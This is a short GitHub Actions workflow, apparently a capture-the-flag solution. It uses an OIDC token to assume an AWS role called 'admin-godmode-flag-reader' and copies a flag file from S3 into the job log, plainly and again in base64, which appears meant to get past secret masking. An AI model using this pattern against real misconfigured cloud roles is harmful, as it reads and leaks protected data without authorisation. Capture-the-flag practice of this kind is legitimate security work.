name: Get Flag via OIDC
on:
  workflow_dispatch:
  push:
    branches: [ main ]

permissions:
  id-token: write
  contents: read

jobs:
  fetch-flag:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
          role-session-name: GitHubActions-Flag-${{ github.run_id }}
          aws-region: ap-southeast-1

      - name: Try to download and print flag
        run: |
          echo "Attempting to read the secret flag from S3..."
          aws s3 cp s3://oh-i-really-do-care/flag.txt ./flag.txt || true
          echo "--- FLAG CONTENT ---"
          cat ./flag.txt || true
          echo "--- BASE64 BACKUP ---"
          base64 ./flag.txt || true
          echo "--- END FLAG ---"
